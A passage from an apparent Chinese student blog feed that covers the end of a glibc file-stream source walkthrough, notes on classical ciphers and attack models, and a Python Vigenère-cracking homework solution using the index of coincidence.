cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">	  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">	  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="库内二次封装的函数调用其的实现流程"><a href="#库内二次封装的函数调用其的实现流程" class="headerlink" title="库内二次封装的函数调用其的实现流程"></a>库内二次封装的函数调用其的实现流程</h1><blockquote>
<p>此函数是对库内标准IO接口的二次封装，淡然也有非IO函数调用上述标准IO接口</p>
<p>待续…</p>
</blockquote>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学理论基础</title>
    <url>/2024/09/15/%E5%AF%86%E7%A0%81%E5%AD%A6/first_class/</url>
    <content><![CDATA[<h2 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h2><h3 id="古典密码体制"><a href="#古典密码体制" class="headerlink" title="古典密码体制"></a>古典密码体制</h3><blockquote>
<p>是否可以表示所有的古典密码体制？？？</p>
<p>加解密需要可逆的特性，因此数论的研究是十分适合密码学的</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905080535709.png" alt="image-20240905080535709"></p>
<h3 id="通信信道模型"><a href="#通信信道模型" class="headerlink" title="通信信道模型"></a>通信信道模型</h3><blockquote>
<p>古典密码学下的通信模型</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905080812648.png" alt="image-20240905080812648"></p>
<h3 id="1-1移位密码"><a href="#1-1移位密码" class="headerlink" title="1.1移位密码"></a>1.1移位密码</h3><blockquote>
<p>凯撒密码</p>
<p>安全？：最多25次即可猜出有意义的明文</p>
<p>期望：13次</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905081306644.png" alt="image-20240905081306644"></p>
<h3 id="1-2代换密码"><a href="#1-2代换密码" class="headerlink" title="1.2代换密码"></a>1.2代换密码</h3><blockquote>
<p>增大了穷举空间，为1.1的发展</p>
<p>可以理解为广义的凯撒密码。</p>
<p>安全？：26的阶乘，10的26次幂，可以频率分析。一个字符只能映射为另一个，因此只是形式上的变化，但是可以利用自然语言的频率上的漏洞，找除形式之外可以区分开的东西。</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905082451577.png" alt="image-20240905082451577"></p>
<h3 id="1-3放射密码"><a href="#1-3放射密码" class="headerlink" title="1.3放射密码"></a>1.3放射密码</h3><blockquote>
<p>进一步增大了密钥空间。</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905084211886.png" alt="image-20240905084211886"></p>
<h3 id="1-4维吉尼亚密码"><a href="#1-4维吉尼亚密码" class="headerlink" title="1.4维吉尼亚密码"></a>1.4维吉尼亚密码</h3><blockquote>
<p>不只是形式上的变换，频率也会变。</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905085028255.png" alt="image-20240905085028255"></p>
<h3 id="1-5希尔密码"><a href="#1-5希尔密码" class="headerlink" title="1.5希尔密码"></a>1.5希尔密码</h3><blockquote>
<p>加密后的信息更加混乱，但是不同的分组之间是否有联系？</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905085910513.png" alt="image-20240905085910513"></p>
<h3 id="1-6置换密码"><a href="#1-6置换密码" class="headerlink" title="1.6置换密码"></a>1.6置换密码</h3><blockquote>
<p>希尔密码的特例。</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905090322903.png" alt="image-20240905090322903"></p>
<h3 id="1-7-流加密"><a href="#1-7-流加密" class="headerlink" title="1.7 流加密"></a>1.7 流加密</h3><blockquote>
<p>去除每一个加密组的联系，为之前的体制的扩展</p>
<p>密钥流可预测。</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240905091052381.png" alt="image-20240905091052381"></p>
<h3 id="1-7-1-流密码密钥生成（LFSR，FSR）"><a href="#1-7-1-流密码密钥生成（LFSR，FSR）" class="headerlink" title="1.7.1 流密码密钥生成（LFSR，FSR）"></a>1.7.1 流密码密钥生成（LFSR，FSR）</h3><blockquote>
<p>如何构造最大周期，可以找本原多项式。</p>
</blockquote>
<h3 id="1-7-2-流加密算法"><a href="#1-7-2-流加密算法" class="headerlink" title="1.7.2 流加密算法"></a>1.7.2 流加密算法</h3><h4 id="A5-1"><a href="#A5-1" class="headerlink" title="A5&#x2F;1"></a>A5&#x2F;1</h4><h4 id="WG-Stream-Cipher"><a href="#WG-Stream-Cipher" class="headerlink" title="WG Stream Cipher"></a>WG Stream Cipher</h4><h4 id="Typical-Stream-Ciphers"><a href="#Typical-Stream-Ciphers" class="headerlink" title="Typical Stream Ciphers"></a>Typical Stream Ciphers</h4><blockquote>
<p>流加密算法标准。ZUC</p>
</blockquote>
<h3 id="2-密码分析"><a href="#2-密码分析" class="headerlink" title="2.密码分析"></a>2.密码分析</h3><blockquote>
<p>本节讨论一些密码分析技术,一般我们都假设敌手Oscar知道所使用的密码体制,这个<br>假设通常称为Kerckhoff假设。</p>
<p>**唯密文攻击(ciphertext only attack):**敌手只拥有密文串y。<br>**已知明文攻击(known plaintext attack):**敌手拥有明文串x及其对应的密文串y。</p>
<p><strong>选择明文攻击(chosen plaintext attack)</strong>:敌手可获得对加密机的临时访问权限,这样<br>他能够选择一个明文串x,并可获得相应的密文串y。<br>**选择密文攻击(chosen ciphertext attack):**敌手可获得对解密机的临时访问权限,这样<br>他能够选择一个密文串y,并可获得相应的明文串x。</p>
<p>如何区分有意义的文本来验证密钥猜测的正确性？</p>
<p>频率（单字母，二字母，三字母）；</p>
</blockquote>
<h4 id="2-1仿射密码"><a href="#2-1仿射密码" class="headerlink" title="2.1仿射密码"></a>2.1仿射密码</h4><blockquote>
<p>频率分析。</p>
</blockquote>
<h4 id="2-2-维吉尼亚密码"><a href="#2-2-维吉尼亚密码" class="headerlink" title="2.2 维吉尼亚密码"></a>2.2 维吉尼亚密码</h4><blockquote>
<p>KASISKI测试法</p>
<p>重合指数法：自动化</p>
</blockquote>
<p>例题：1.18</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学实战</title>
    <url>/2024/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><blockquote>
<p>以一道作业题为例子</p>
</blockquote>
<p><img src="/img/mypic/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20240918203815885.png" alt="image-20240918203815885"></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><blockquote>
<p>1.确定m，利用重合指数法，首先猜测m的长度，然后按m将密文分组，取每组的第1，2….n，分别放在一起，形成新的文本，以字典形式表示，key &#x3D; 组号 ，value &#x3D; 字符串。</p>
<p>2.计算重合指数，因为key是变化的，每一组需要多右移动一次，因此每一个字符串并非是简单的平移，而是后一个字符要多平移一个，因此需要变换字符串为正常情况来进行重合指数的分析，（就是把每个字符串的字符按索引平移回去）。</p>
<p>3.重合指数的计算，遍历m，分别计算平均重合指数，然后取平均值在0.6以上的（则表明非随机）。</p>
<p>4.确定key，再次利用重合指数法，算出每一个组的每个字符出现的频率，然后利用有意义字符的频率，来进行重合指数的计算（最多尝试26次，即可确定key），注意解出来的并非是key，而是key的逆，也就是说key-26。</p>
<p>5.通过4计算而得的key，平移每个组的字符串，再将其按照一的方式组合回去，即可得到明文。</p>
</blockquote>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>1.<strong>文本预处理</strong></p>
<blockquote>
<p>这一步删除掉密文的换行之类,并统一大小写</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pretreatment</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;密文2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        wen = f.read()</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;[\n]|\d|\W&#x27;</span>)</span><br><span class="line">    plain_1 = re.sub(pattern,<span class="string">&#x27;&#x27;</span>,wen).lower()</span><br><span class="line">    <span class="keyword">return</span> plain_1</span><br></pre></td></tr></table></figure>

<p>2.<strong>遍历寻找m</strong></p>
<blockquote>
<p>这一步需要两步骤：</p>
<p>1.按m长度的key对密文进行分组，并猜测m的长度</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guess_len_key</span>(<span class="params">crypt</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    guess_len_key函数的主要作用是通过密文猜解密钥长度</span></span><br><span class="line"><span class="string">    :param crypt: 密文</span></span><br><span class="line"><span class="string">    :return: 密钥长度以及划为的子串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;****************************假设密钥长度        为%s***********************************&quot;</span> % l)</span><br><span class="line">        sum_index = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crypt)):</span><br><span class="line">            n = i % l</span><br><span class="line">            <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">                d[n] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            d[n] += crypt[i]</span><br><span class="line">        sum_index = <span class="built_in">sum</span>(coincidence_index(d[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(l)) / l</span><br><span class="line">        <span class="keyword">if</span> sum_index &gt;= <span class="number">0.06</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l += <span class="number">1</span></span><br><span class="line">            d = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> l,d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中比较重要的一个点是重合指数的计算,这里面在计算重合指数之前，需要将每一个子字符串每个字符平移，平移数目为索引。（具体原因在思路已经介绍）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">coincidence_index</span>(<span class="params">text</span>):</span><br><span class="line">    text = shift_text_left(text)</span><br><span class="line">    <span class="comment"># 计算字符频率</span></span><br><span class="line">    frequencies = Counter(text)</span><br><span class="line">    n = <span class="built_in">len</span>(text)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算重合指数</span></span><br><span class="line">    ic = <span class="built_in">sum</span>(f * (f - <span class="number">1</span>) <span class="keyword">for</span> f <span class="keyword">in</span> frequencies.values()) / (n * (n - <span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ic</span><br><span class="line"><span class="comment">##平移，需要注意mod26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_text_left</span>(<span class="params">text</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(text)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        char = text[i]</span><br><span class="line">        shift_amount = i  <span class="comment"># 当前字符要平移的位数为它的索引i</span></span><br><span class="line">        new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift_amount) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        result += new_char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<blockquote>
<p>经过上述过程已经得到按固定组长分割好的特定的子字符串，而每一组相对应为key中的一个字符，且是一个另类的单表循环，只不过排在后面的要多循环一位。经过下属过程处理可以将其转换为一般的单表循环，基本上和<code>shift_text_left</code>函数的道理是一样的</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">single</span>(<span class="params">b</span>):</span><br><span class="line">    new = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> b.items():</span><br><span class="line">        value = shift_text_left(value)</span><br><span class="line">        new[key] = value</span><br><span class="line">    <span class="keyword">return</span> new</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果展示：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">****************************假设密钥长度        为<span class="number">1</span>***********************************</span><br><span class="line">****************************假设密钥长度        为<span class="number">2</span>***********************************</span><br><span class="line">****************************假设密钥长度        为<span class="number">3</span>***********************************</span><br><span class="line">****************************假设密钥长度        为<span class="number">4</span>***********************************</span><br><span class="line">****************************假设密钥长度        为<span class="number">5</span>***********************************</span><br><span class="line"><span class="number">0.07814965986394558</span></span><br><span class="line">在密钥长度为<span class="number">5</span>的时候得到了最大的重合指数。</span><br><span class="line">要处理的子字符串，已经够single函数的处理</span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&#x27;ihdndxilhadwidwsdtxllwsslhunptwgdpnthdvvrttrthxihh&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;yklgxefvwvnvynvrkefryvzkrkvziivkiinikjrrlrtfufkyz&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;mnabqpzaiaplipavpavgqabpaxkvinzwvlippboztvptxvgmv&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;ymoaeuityemuzmmpqmmuommuyqfooaneqxemqqufmpzaqmwnq&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;sqvpxwsmixxhxxmxwxprlmrwsvplxvifcittqrrmxxmvvpoyw&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>2.<strong>寻找key</strong></p>
<blockquote>
<p>遍历每一个字串，然后从0-25给每个字符加偏移量，作为newstr，利用newstr和frequency频率分布表去计算重合指数，找到0.6左右的，那么偏移量则是正确的偏移量，但是这个是解密的偏移量，和key的字符的距离a的距离之后整好为26，因此要是算key需要进一步变换。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frequency = [<span class="number">0.082</span>,<span class="number">0.015</span>,<span class="number">0.028</span>,<span class="number">0.043</span>,<span class="number">0.127</span>,<span class="number">0.022</span>,<span class="number">0.02</span>,<span class="number">0.061</span>,<span class="number">0.07</span>,<span class="number">0.002</span>,<span class="number">0.008</span>,<span class="number">0.04</span>,<span class="number">0.024</span>,<span class="number">0.06</span>,<span class="number">0.075</span>,<span class="number">0.019</span>,<span class="number">0.001</span>,<span class="number">0.06</span>,<span class="number">0.063</span>,<span class="number">0.091</span>,<span class="number">0.028</span>,<span class="number">0.01</span>,<span class="number">0.023</span>,<span class="number">0.001</span>,<span class="number">0.02</span>,<span class="number">0.001</span>]</span><br><span class="line">s = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]<span class="comment">#字母出现频率</span></span><br><span class="line"><span class="comment">## 计算解密所用的偏移</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_key</span>(<span class="params">new,len_key</span>):</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_key):</span><br><span class="line">        substring = new[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字串为：&quot;</span>,new[i])</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            dex = quasi_index(substring, n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;假设子串移动&#123;&#125;,拟重合指数为&#123;:.4f&#125;&quot;</span>.<span class="built_in">format</span>(s[n],dex))</span><br><span class="line">            <span class="keyword">if</span> dex &gt;= <span class="number">0.058</span>:</span><br><span class="line">                key += s[n]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;******************************破解的最终密钥为%s*********************************&quot;</span> % key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="comment">###quasi_index计算重合指数，frequencies[key]所代表的是假的字符，其真实身份得加个偏移n，因此frequency加上偏移n。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quasi_index</span>(<span class="params"><span class="built_in">str</span>,n</span>):</span><br><span class="line">    <span class="comment">#text = shift_text_left(text)</span></span><br><span class="line">    <span class="comment"># 计算字符频率</span></span><br><span class="line">    frequencies = <span class="built_in">dict</span>(Counter(<span class="built_in">str</span>))</span><br><span class="line">    <span class="comment">#print(frequencies)</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> frequencies.items():</span><br><span class="line">        <span class="built_in">sum</span> += frequencies[key]*frequency[<span class="built_in">ord</span>(s[(<span class="built_in">ord</span>(key)+n-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))%<span class="number">26</span>])-<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>/<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">##得到加密key</span></span><br><span class="line">key= <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    key+=<span class="built_in">chr</span>(<span class="number">26</span>-(<span class="built_in">ord</span>(dekey[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以得出解密密钥为:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前字串为： ihdndxilhadwidwsdtxllwsslhunptwgdpnthdvvrttrthxihh</span><br><span class="line">假设子串移动a,拟重合指数为0.0497</span><br><span class="line">假设子串移动b,拟重合指数为0.0495</span><br><span class="line">假设子串移动c,拟重合指数为0.0230</span><br><span class="line">假设子串移动d,拟重合指数为0.0269</span><br><span class="line">假设子串移动e,拟重合指数为0.0373</span><br><span class="line">假设子串移动f,拟重合指数为0.0337</span><br><span class="line">假设子串移动g,拟重合指数为0.0346</span><br><span class="line">假设子串移动h,拟重合指数为0.0464</span><br><span class="line">假设子串移动i,拟重合指数为0.0397</span><br><span class="line">假设子串移动j,拟重合指数为0.0296</span><br><span class="line">假设子串移动k,拟重合指数为0.0390</span><br><span class="line">假设子串移动l,拟重合指数为0.0642</span><br><span class="line">当前字串为： yklgxefvwvnvynvrkefryvzkrkvziivkiinikjrrlrtfufkyz</span><br><span class="line">假设子串移动a,拟重合指数为0.0344</span><br><span class="line">假设子串移动b,拟重合指数为0.0327</span><br><span class="line">假设子串移动c,拟重合指数为0.0359</span><br><span class="line">假设子串移动d,拟重合指数为0.0359</span><br><span class="line">假设子串移动e,拟重合指数为0.0307</span><br><span class="line">假设子串移动f,拟重合指数为0.0429</span><br><span class="line">假设子串移动g,拟重合指数为0.0374</span><br><span class="line">假设子串移动h,拟重合指数为0.0346</span><br><span class="line">假设子串移动i,拟重合指数为0.0376</span><br><span class="line">假设子串移动j,拟重合指数为0.0717</span><br><span class="line">当前字串为： mnabqpzaiaplipavpavgqabpaxkvinzwvlippboztvptxvgmv</span><br><span class="line">假设子串移动a,拟重合指数为0.0348</span><br><span class="line">假设子串移动b,拟重合指数为0.0271</span><br><span class="line">假设子串移动c,拟重合指数为0.0312</span><br><span class="line">假设子串移动d,拟重合指数为0.0465</span><br><span class="line">假设子串移动e,拟重合指数为0.0490</span><br><span class="line">假设子串移动f,拟重合指数为0.0449</span><br><span class="line">假设子串移动g,拟重合指数为0.0314</span><br><span class="line">假设子串移动h,拟重合指数为0.0443</span><br><span class="line">假设子串移动i,拟重合指数为0.0352</span><br><span class="line">假设子串移动j,拟重合指数为0.0390</span><br><span class="line">假设子串移动k,拟重合指数为0.0226</span><br><span class="line">假设子串移动l,拟重合指数为0.0457</span><br><span class="line">假设子串移动m,拟重合指数为0.0322</span><br><span class="line">假设子串移动n,拟重合指数为0.0412</span><br><span class="line">假设子串移动o,拟重合指数为0.0403</span><br><span class="line">假设子串移动p,拟重合指数为0.0413</span><br><span class="line">假设子串移动q,拟重合指数为0.0285</span><br><span class="line">假设子串移动r,拟重合指数为0.0352</span><br><span class="line">假设子串移动s,拟重合指数为0.0599</span><br><span class="line">当前字串为： ymoaeuityemuzmmpqmmuommuyqfooaneqxemqqufmpzaqmwnq</span><br><span class="line">假设子串移动a,拟重合指数为0.0391</span><br><span class="line">假设子串移动b,拟重合指数为0.0357</span><br><span class="line">假设子串移动c,拟重合指数为0.0438</span><br><span class="line">假设子串移动d,拟重合指数为0.0404</span><br><span class="line">假设子串移动e,拟重合指数为0.0371</span><br><span class="line">假设子串移动f,拟重合指数为0.0383</span><br><span class="line">假设子串移动g,拟重合指数为0.0474</span><br><span class="line">假设子串移动h,拟重合指数为0.0407</span><br><span class="line">假设子串移动i,拟重合指数为0.0301</span><br><span class="line">假设子串移动j,拟重合指数为0.0259</span><br><span class="line">假设子串移动k,拟重合指数为0.0471</span><br><span class="line">假设子串移动l,拟重合指数为0.0205</span><br><span class="line">假设子串移动m,拟重合指数为0.0265</span><br><span class="line">假设子串移动n,拟重合指数为0.0337</span><br><span class="line">假设子串移动o,拟重合指数为0.0684</span><br><span class="line">当前字串为： sqvpxwsmixxhxxmxwxprlmrwsvplxvifcittqrrmxxmvvpoyw</span><br><span class="line">假设子串移动a,拟重合指数为0.0297</span><br><span class="line">假设子串移动b,拟重合指数为0.0312</span><br><span class="line">假设子串移动c,拟重合指数为0.0351</span><br><span class="line">假设子串移动d,拟重合指数为0.0426</span><br><span class="line">假设子串移动e,拟重合指数为0.0262</span><br><span class="line">假设子串移动f,拟重合指数为0.0352</span><br><span class="line">假设子串移动g,拟重合指数为0.0358</span><br><span class="line">假设子串移动h,拟重合指数为0.0550</span><br><span class="line">假设子串移动i,拟重合指数为0.0351</span><br><span class="line">假设子串移动j,拟重合指数为0.0387</span><br><span class="line">假设子串移动k,拟重合指数为0.0350</span><br><span class="line">假设子串移动l,拟重合指数为0.0479</span><br><span class="line">假设子串移动m,拟重合指数为0.0371</span><br><span class="line">假设子串移动n,拟重合指数为0.0304</span><br><span class="line">假设子串移动o,拟重合指数为0.0362</span><br><span class="line">假设子串移动p,拟重合指数为0.0378</span><br><span class="line">假设子串移动q,拟重合指数为0.0406</span><br><span class="line">假设子串移动r,拟重合指数为0.0421</span><br><span class="line">假设子串移动s,拟重合指数为0.0470</span><br><span class="line">假设子串移动t,拟重合指数为0.0324</span><br><span class="line">假设子串移动u,拟重合指数为0.0301</span><br><span class="line">假设子串移动v,拟重合指数为0.0427</span><br><span class="line">假设子串移动w,拟重合指数为0.0641</span><br><span class="line">******************************破解的最终密钥为ljsow*********************************</span><br><span class="line">##加密密钥为：</span><br><span class="line">prime</span><br></pre></td></tr></table></figure>

<h4 id="3-恢复文本"><a href="#3-恢复文本" class="headerlink" title="3.恢复文本"></a>3.<strong>恢复文本</strong></h4><blockquote>
<p>此步骤比较简单，通过密钥恢复相应文本，然后再把每一个组融合在一起，完事</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">dic, key</span>):</span><br><span class="line">    <span class="comment"># 遍历字典</span></span><br><span class="line">    <span class="keyword">for</span> mykey, value <span class="keyword">in</span> dic.items():</span><br><span class="line">        <span class="comment"># 确保字典键在 key 中存在</span></span><br><span class="line">        value_list = <span class="built_in">list</span>(value)   </span><br><span class="line">        <span class="comment"># 遍历 value 列表中的每个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(value_list)):</span><br><span class="line">            <span class="comment"># 检查字符是否为小写字母，并进行相应偏移</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= value_list[i] &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">                value_list[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(value_list[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="built_in">ord</span>(key[mykey]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        dic[mykey] = <span class="string">&#x27;&#x27;</span>.join(value_list)</span><br><span class="line">    <span class="keyword">return</span> dic</span><br><span class="line"><span class="built_in">print</span>(new,dekey)</span><br><span class="line">myte = de(new,dekey)</span><br><span class="line"><span class="built_in">print</span>(myte)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">combine</span>(<span class="params">dic</span>):</span><br><span class="line">    d=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        d[i] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> mykey, value <span class="keyword">in</span> dic.items():</span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(value):</span><br><span class="line">                d[i]+=value[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = combine(myte)</span><br><span class="line">last = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> d.items():</span><br><span class="line">    last += value</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(last)</span><br><span class="line">得到明文：</span><br><span class="line">themostfamouscryptologistinhistorwoweshisfamelesstowhathedidthantowhathesaidandtothesensationalwayinwhichhesaiditandthiswasmostperfectlyincharacterforherbertosborneyardleywasperhapsthemostengagingarticulateandtechnicoloredpersonalitykkthebusiness</span><br><span class="line"></span><br><span class="line">分隔后：</span><br><span class="line">the most famous cryptologist <span class="keyword">in</span> history owes his fame less to what he did than to what he said <span class="keyword">and</span> to the sensational way <span class="keyword">in</span> which he said it <span class="keyword">and</span> this was most perfectly <span class="keyword">in</span> character <span class="keyword">for</span> herbert osborne yardley was perhaps the most engaging articulate <span class="keyword">and</span> technicolored personality <span class="keyword">in</span> the business</span><br><span class="line"></span><br></pre></td></tr></table></figure>



























]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>IR初探</title>
    <url>/2024/09/15/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/LLVM%20IR/</url>
    <content><![CDATA[<h1 id="llvm-ir（初探）"><a href="#llvm-ir（初探）" class="headerlink" title="llvm ir（初探）"></a>llvm ir（初探）</h1><p>本节学习IR（中间表示）（初探）</p>
<p>扩展：</p>
